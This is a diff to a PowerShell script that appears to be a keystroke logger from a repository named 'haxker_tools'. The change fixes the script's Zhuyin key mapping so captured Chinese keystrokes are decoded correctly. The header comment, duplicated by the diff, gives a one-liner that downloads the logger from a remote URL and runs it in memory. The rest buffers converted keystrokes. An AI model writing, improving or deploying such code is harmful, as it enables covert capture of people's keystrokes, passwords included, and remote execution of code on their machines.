@@ -1,6 +1,9 @@
 # 請使用以下方法進行參數傳送
 # & ([scriptblock]::Create((iwr -UseBasicParsing "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/input_log/log.txt").Content)) -time 10
 
+# 請使用以下方法進行參數傳送
+# & ([scriptblock]::Create((iwr -UseBasicParsing "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/input_log/log.txt").Content)) -time 10
+
 param(
     [Parameter(Mandatory=$true)]
     [int]$time
@@ -372,24 +375,24 @@ function Get-CurrentLanguage {
 # 建立按鍵文字緩衝區
 $textBuffer = New-Object System.Text.StringBuilder
 
-# --- 自訂注音鍵盤對照表與狀態變數 ---
+# --- 自訂注音鍵盤對照表（使用全小寫避免 PS Hashtable Case-Insensitive 重複 Key 錯誤） ---
 $zhuyinInitials = @{
-    '1'='ㄅ'; 'q'='ㄆ'; 'Q'='ㄆ'; 'a'='ㄇ'; 'A'='ㄇ'; 'z'='ㄈ'; 'Z'='ㄈ'
-    '2'='ㄉ'; 'w'='ㄊ'; 'W'='ㄊ'; 's'='ㄋ'; 'S'='ㄋ'; 'x'='ㄌ'; 'X'='ㄌ'
-    'e'='ㄍ'; 'E'='ㄍ'; 'd'='ㄎ'; 'D'='ㄎ'; 'c'='ㄏ'; 'C'='ㄏ'
-    'r'='ㄐ'; 'R'='ㄐ'; 'f'='ㄑ'; 'F'='ㄑ'; 'v'='ㄒ'; 'V'='ㄒ'
-    '5'='ㄓ'; 't'='ㄔ'; 'T'='ㄔ'; 'g'='ㄕ'; 'G'='ㄕ'; 'b'='ㄖ'; 'B'='ㄖ'
-    'y'='ㄗ'; 'Y'='ㄗ'; 'h'='ㄘ'; 'H'='ㄘ'; 'n'='ㄙ'; 'N'='ㄙ'
+    '1'='ㄅ'; 'q'='ㄆ'; 'a'='ㄇ'; 'z'='ㄈ'
+    '2'='ㄉ'; 'w'='ㄊ'; 's'='ㄋ'; 'x'='ㄌ'
+    'e'='ㄍ'; 'd'='ㄎ'; 'c'='ㄏ'
+    'r'='ㄐ'; 'f'='ㄑ'; 'v'='ㄒ'
+    '5'='ㄓ'; 't'='ㄔ'; 'g'='ㄕ'; 'b'='ㄖ'
+    'y'='ㄗ'; 'h'='ㄘ'; 'n'='ㄙ'
 }
 
 $zhuyinMedials = @{
-    'u'='ㄧ'; 'U'='ㄧ'; 'j'='ㄨ'; 'J'='ㄨ'; 'm'='ㄩ'; 'M'='ㄩ'
+    'u'='ㄧ'; 'j'='ㄨ'; 'm'='ㄩ'
 }
 
 $zhuyinFinals = @{
-    '8'='ㄚ'; 'i'='ㄛ'; 'I'='ㄛ'; 'k'='ㄜ'; 'K'='ㄜ'; ','='ㄝ'
-    '9'='ㄞ'; 'o'='ㄟ'; 'O'='ㄟ'; 'l'='ㄠ'; 'L'='ㄠ'; '.'='ㄡ'
-    '0'='ㄢ'; 'p'='ㄣ'; 'P'='ㄣ'; ';'='ㄤ'; '/'='ㄥ'; '-'='ㄦ'
+    '8'='ㄚ'; 'i'='ㄛ'; 'k'='ㄜ'; ','='ㄝ'
+    '9'='ㄞ'; 'o'='ㄟ'; 'l'='ㄠ'; '.'='ㄡ'
+    '0'='ㄢ'; 'p'='ㄣ'; ';'='ㄤ'; '/'='ㄥ'; '-'='ㄦ'
 }
 
 $zhuyinTones = @{
@@ -578,10 +581,11 @@ while ($true) {
                         $ch = $type::VkToChar($vk, $keyStateBuffer)
                         if ($ch -and $ch.Length -gt 0 -and [int][char]$ch[0] -ge 32) {
                             if ($isChineseMode) {
+                                $chLower = $ch.ToLower()
                                 $hasZhBuffer = [bool]($script:zhInitial -or $script:zhMedial -or $script:zhFinal)
 
-                                if ($zhuyinTones.ContainsKey($ch)) {
-                                    if ($ch -eq ' ') {
+                                if ($zhuyinTones.ContainsKey($chLower)) {
+                                    if ($chLower -eq ' ') {
                                         if ($hasZhBuffer) {
                                             Commit-ZhuyinSyllable $zhuyinTones[' ']
                                         } else {
@@ -589,22 +593,22 @@ while ($true) {
                                         }
                                     } else {
                                         if ($hasZhBuffer) {
-                                            Commit-ZhuyinSyllable $zhuyinTones[$ch]
+                                            Commit-ZhuyinSyllable $zhuyinTones[$chLower]
                                         } else {
                                             Commit-ZhuyinSyllable
                                             $null = $textBuffer.Append($ch)
                                         }
                                     }
-                                } elseif ($zhuyinInitials.ContainsKey($ch)) {
-                                    $script:zhInitial = $zhuyinInitials[$ch]
+                                } elseif ($zhuyinInitials.ContainsKey($chLower)) {
+                                    $script:zhInitial = $zhuyinInitials[$chLower]
                                     if ($script:zhHistory.Contains('I')) { $script:zhHistory.Remove('I') }
                                     $script:zhHistory.Add('I')
-                                } elseif ($zhuyinMedials.ContainsKey($ch)) {
-                                    $script:zhMedial = $zhuyinMedials[$ch]
+                                } elseif ($zhuyinMedials.ContainsKey($chLower)) {
+                                    $script:zhMedial = $zhuyinMedials[$chLower]
                                     if ($script:zhHistory.Contains('M')) { $script:zhHistory.Remove('M') }
                                     $script:zhHistory.Add('M')
-                                } elseif ($zhuyinFinals.ContainsKey($ch)) {
-                                    $script:zhFinal = $zhuyinFinals[$ch]
+                                } elseif ($zhuyinFinals.ContainsKey($chLower)) {
+                                    $script:zhFinal = $zhuyinFinals[$chLower]
                                     if ($script:zhHistory.Contains('F')) { $script:zhHistory.Remove('F') }
                                     $script:zhHistory.Add('F')
                                 } else {
